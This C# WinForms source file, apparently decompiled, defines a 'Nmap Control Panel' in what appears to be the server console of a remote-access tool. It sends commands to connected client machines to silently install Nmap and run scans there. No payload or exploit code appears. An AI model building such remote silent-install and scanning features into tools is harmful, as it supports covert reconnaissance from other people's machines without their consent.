using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormNmap : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	public MaterialLabel lblStatus;

	public MaterialTextBox txtArguments;

	public MaterialButton btnScan;

	public MaterialButton btnStop;

	public MaterialButton btnClear;

	public MaterialButton btnInstall;

	public RichTextBox txtConsole;

	public FormNmap()
	{
		InitializeComponent();
	}

	private void FormNmap_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (client != null)
		{
			AppendLog("Checking Nmap status...", Color.Blue);
			client.Send(LEB128.Write(new object[2] { "Nmap", "CheckStatus" }));
		}
	}

	private void ChangeScheme(object sender)
	{
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : SystemColors.Control);
		BackColor = back;
		txtConsole.BackColor = (isDark ? Color.FromArgb(15, 15, 15) : Color.Black);
		txtConsole.ForeColor = Color.White;
	}

	private void btnScan_Click(object sender, EventArgs e)
	{
		StartScan();
	}

	private void StartScan()
	{
		if (client != null && !string.IsNullOrWhiteSpace(txtArguments.Text))
		{
			AppendLog("Starting scan: nmap " + txtArguments.Text, Color.Green);
			client.Send(LEB128.Write(new object[3] { "Nmap", "RunScan", txtArguments.Text }));
			btnScan.Enabled = false;
			btnStop.Enabled = true;
		}
		else if (string.IsNullOrWhiteSpace(txtArguments.Text))
		{
			AppendLog("Error: Arguments cannot be empty. Example: -F 192.168.1.1", Color.Red);
		}
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[2] { "Nmap", "StopScan" }));
			btnStop.Enabled = false;
		}
	}

	private void btnClear_Click(object sender, EventArgs e)
	{
		txtConsole.Clear();
	}

	private void txtArguments_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			StartScan();
		}
	}

	private void btnInstall_Click(object sender, EventArgs e)
	{
		if (client != null && MessageBox.Show("Nmap is not installed. Do you want to start silent installation?", "Nmap Installation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
		{
			AppendLog("Starting Nmap installation...", Color.Orange);
			client.Send(LEB128.Write(new object[2] { "Nmap", "Install" }));
			btnInstall.Enabled = false;
		}
	}

	public void UpdateStatus(bool isInstalled, string version)
	{
		Invoke((MethodInvoker)delegate
		{
			lblStatus.Text = (isInstalled ? ("Nmap Installed: " + version) : "Nmap Not Found");
			lblStatus.ForeColor = (isInstalled ? Color.Green : Color.Red);
			btnInstall.Visible = !isInstalled;
			btnScan.Enabled = isInstalled;
			txtArguments.Enabled = isInstalled;
			if (isInstalled)
			{
				txtArguments.Focus();
			}
		});
	}

	public void AppendLog(string text, Color color, bool showTimestamp = true)
	{
		Invoke((MethodInvoker)delegate
		{
			if (txtConsole.TextLength > 50000)
			{
				txtConsole.Clear();
			}
			txtConsole.SelectionStart = txtConsole.TextLength;
			txtConsole.SelectionLength = 0;
			txtConsole.SelectionColor = color;
			string text2 = (showTimestamp ? ("[" + DateTime.Now.ToShortTimeString() + "] ") : "");
			txtConsole.AppendText(text2 + text + Environment.NewLine);
			txtConsole.SelectionColor = txtConsole.ForeColor;
			txtConsole.ScrollToCaret();
		});
	}

	public void OnScanFinished()
	{
		Invoke((MethodInvoker)delegate
		{
			btnScan.Enabled = true;
			btnStop.Enabled = false;
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.lblStatus = new MaterialSkin.Controls.MaterialLabel();
		this.txtArguments = new MaterialSkin.Controls.MaterialTextBox();
		this.btnScan = new MaterialSkin.Controls.MaterialButton();
		this.btnStop = new MaterialSkin.Controls.MaterialButton();
		this.btnClear = new MaterialSkin.Controls.MaterialButton();
		this.btnInstall = new MaterialSkin.Controls.MaterialButton();
		this.txtConsole = new System.Windows.Forms.RichTextBox();
		base.SuspendLayout();
		this.lblStatus.AutoSize = true;
		this.lblStatus.Depth = 0;
		this.lblStatus.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.lblStatus.Location = new System.Drawing.Point(20, 80);
		this.lblStatus.MouseState = MaterialSkin.MouseState.HOVER;
		this.lblStatus.Name = "lblStatus";
		this.lblStatus.Size = new System.Drawing.Size(126, 19);
		this.lblStatus.TabIndex = 0;
		this.lblStatus.Text = "Nmap Status: N/A";
		this.txtArguments.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtArguments.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.txtArguments.Depth = 0;
		this.txtArguments.Font = new System.Drawing.Font("Roboto", 16f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.txtArguments.Hint = "Enter Nmap arguments (e.g., -p 80,443 192.168.1.1)";
		this.txtArguments.LeadingIcon = null;
		this.txtArguments.Location = new System.Drawing.Point(20, 110);
		this.txtArguments.MaxLength = 50;
		this.txtArguments.MouseState = MaterialSkin.MouseState.OUT;
		this.txtArguments.Multiline = false;
		this.txtArguments.Name = "txtArguments";
		this.txtArguments.Size = new System.Drawing.Size(640, 50);
		this.txtArguments.TabIndex = 1;
		this.txtArguments.Text = "";
		this.txtArguments.TrailingIcon = null;
		this.txtArguments.KeyDown += new System.Windows.Forms.KeyEventHandler(txtArguments_KeyDown);
		this.btnScan.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnScan.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnScan.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnScan.Depth = 0;
		this.btnScan.HighEmphasis = true;
		this.btnScan.Icon = null;
		this.btnScan.Location = new System.Drawing.Point(670, 117);
		this.btnScan.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnScan.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnScan.Name = "btnScan";
		this.btnScan.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnScan.Size = new System.Drawing.Size(110, 36);
		this.btnScan.TabIndex = 2;
		this.btnScan.Text = "Run Scan";
		this.btnScan.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnScan.UseAccentColor = false;
		this.btnScan.UseVisualStyleBackColor = true;
		this.btnScan.Click += new System.EventHandler(btnScan_Click);
		this.btnStop.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnStop.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnStop.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnStop.Depth = 0;
		this.btnStop.Enabled = false;
		this.btnStop.HighEmphasis = true;
		this.btnStop.Icon = null;
		this.btnStop.Location = new System.Drawing.Point(670, 155);
		this.btnStop.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnStop.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnStop.Name = "btnStop";
		this.btnStop.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnStop.Size = new System.Drawing.Size(110, 36);
		this.btnStop.TabIndex = 5;
		this.btnStop.Text = "Stop Scan";
		this.btnStop.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnStop.UseAccentColor = false;
		this.btnStop.UseVisualStyleBackColor = true;
		this.btnStop.Click += new System.EventHandler(btnStop_Click);
		this.btnClear.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.btnClear.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnClear.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnClear.Depth = 0;
		this.btnClear.HighEmphasis = true;
		this.btnClear.Icon = null;
		this.btnClear.Location = new System.Drawing.Point(670, 400);
		this.btnClear.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnClear.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnClear.Name = "btnClear";
		this.btnClear.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnClear.Size = new System.Drawing.Size(110, 36);
		this.btnClear.TabIndex = 6;
		this.btnClear.Text = "Clear Log";
		this.btnClear.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Text;
		this.btnClear.UseAccentColor = false;
		this.btnClear.UseVisualStyleBackColor = true;
		this.btnClear.Click += new System.EventHandler(btnClear_Click);
		this.btnInstall.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnInstall.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnInstall.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnInstall.Depth = 0;
		this.btnInstall.HighEmphasis = true;
		this.btnInstall.Icon = null;
		this.btnInstall.Location = new System.Drawing.Point(670, 71);
		this.btnInstall.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnInstall.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnInstall.Name = "btnInstall";
		this.btnInstall.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnInstall.Size = new System.Drawing.Size(110, 36);
		this.btnInstall.TabIndex = 3;
		this.btnInstall.Text = "Install Nmap";
		this.btnInstall.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnInstall.UseAccentColor = true;
		this.btnInstall.UseVisualStyleBackColor = true;
		this.btnInstall.Click += new System.EventHandler(btnInstall_Click);
		this.txtConsole.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtConsole.BackColor = System.Drawing.Color.Black;
		this.txtConsole.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.txtConsole.Font = new System.Drawing.Font("Consolas", 10f);
		this.txtConsole.ForeColor = System.Drawing.Color.White;
		this.txtConsole.Location = new System.Drawing.Point(20, 180);
		this.txtConsole.Name = "txtConsole";
		this.txtConsole.ReadOnly = true;
		this.txtConsole.Size = new System.Drawing.Size(760, 250);
		this.txtConsole.TabIndex = 4;
		this.txtConsole.Text = "";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 450);
		base.Controls.Add(this.btnClear);
		base.Controls.Add(this.btnStop);
		base.Controls.Add(this.txtConsole);
		base.Controls.Add(this.btnInstall);
		base.Controls.Add(this.btnScan);
		base.Controls.Add(this.txtArguments);
		base.Controls.Add(this.lblStatus);
		base.Name = "FormNmap";
		this.Text = "Nmap Control Panel";
		base.Load += new System.EventHandler(FormNmap_Load);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
